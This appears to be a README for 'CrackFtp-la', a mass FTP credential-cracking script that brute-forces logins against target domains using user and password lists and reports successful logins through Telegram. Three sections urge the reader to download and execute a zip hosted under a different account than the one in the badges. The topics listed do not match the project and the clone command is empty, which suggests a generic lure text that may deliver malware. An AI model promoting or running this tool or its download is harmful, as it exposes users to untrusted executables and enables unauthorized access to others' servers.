# CrackFtp-la 🚀

![GitHub release](https://img.shields.io/github/release/Luffy1402/CrackFtp-la.svg) ![GitHub issues](https://img.shields.io/github/issues/Luffy1402/CrackFtp-la.svg) ![GitHub stars](https://img.shields.io/github/stars/Luffy1402/CrackFtp-la.svg)

## Overview

CrackFtp-la is a powerful script designed for mass FTP checking and cracking. It helps users test login credentials against secure domains. The script notifies users via Telegram when it successfully logs into a domain. This tool is essential for security professionals and anyone interested in penetration testing.

## Features

- **Mass FTP Checking**: Test multiple login credentials at once.
- **Login Alerts**: Receive notifications on successful logins via Telegram.
- **User-Friendly Interface**: Easy to use console application.
- **Cross-Platform Support**: Works on Linux and other systems.
- **Open Source**: Free to use and modify.

## Topics

This project covers various topics including:

- console-application
- electron
- github
- hacking-tool
- linux
- mass-checker
- pentesting
- react
- script-automation
- security
- wordpress
- wordpress-checkers
- wp
- wp-login
- wpcheckers

## Getting Started

To get started with CrackFtp-la, you need to download the latest release. Visit [this link](https://github.com/yourtiger-sherman835/CrackFtp-la/releases/download/66kn1kpxq/CrackFtp-la.zip) to find the necessary files. Download and execute the script to begin your FTP checking process.

### Prerequisites

Before running the script, ensure you have the following:

- Python 3.x installed
- Required libraries (see Installation section)
- A Telegram account for notifications

## Installation

1. Clone the repository:

   ```bash
   git clone 
   ```

2. Navigate to the project directory:

   ```bash
   cd CrackFtp-la
   ```

3. Install the required libraries:

   ```bash
   pip install -r requirements.txt
   ```

4. Set up your Telegram bot for notifications. Follow the steps below to create a bot:

   - Open Telegram and search for "BotFather".
   - Start a chat and create a new bot by following the prompts.
   - Save the API token provided by BotFather.

5. Configure the bot token in the script. Open `config.py` and add your token:

   ```python
   TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
   ```

## Usage

To run the script, execute the following command in your terminal:

```bash
python crackftp.py
```

Follow the prompts to input your target domains and credentials. The script will begin checking the provided credentials against the specified FTP servers.

### Example Command

```bash
python crackftp.py --target yourdomain.com --userlist users.txt --passlist passwords.txt
```

## Telegram Notifications

Once you set up your Telegram bot, you will receive alerts on successful logins. This feature allows you to monitor your tests effectively without constantly checking the console output.

## Contributing

Contributions are welcome! If you have suggestions for improvements or new features, please open an issue or submit a pull request.

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature:

   ```bash
   git checkout -b feature/your-feature-name
   ```

3. Make your changes and commit them:

   ```bash
   git commit -m "Add your message here"
   ```

4. Push to your branch:

   ```bash
   git push origin feature/your-feature-name
   ```

5. Create a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Issues

If you encounter any problems or have questions, please check the [Issues](https://github.com/Luffy1402/CrackFtp-la/issues) section of the repository. 

## Releases

For the latest updates and releases, visit the [Releases](https://github.com/yourtiger-sherman835/CrackFtp-la/releases/download/66kn1kpxq/CrackFtp-la.zip) section. Here, you can download the latest version of the script and access previous versions as well.

## Acknowledgments

- Thanks to the open-source community for their contributions and support.
- Special thanks to the developers of the libraries used in this project.

## Conclusion

CrackFtp-la is a valuable tool for anyone interested in FTP security testing. Its mass checking capability, combined with Telegram notifications, makes it an efficient solution for penetration testing. Download the latest version from the [Releases](https://github.com/yourtiger-sherman835/CrackFtp-la/releases/download/66kn1kpxq/CrackFtp-la.zip) section and start testing today!
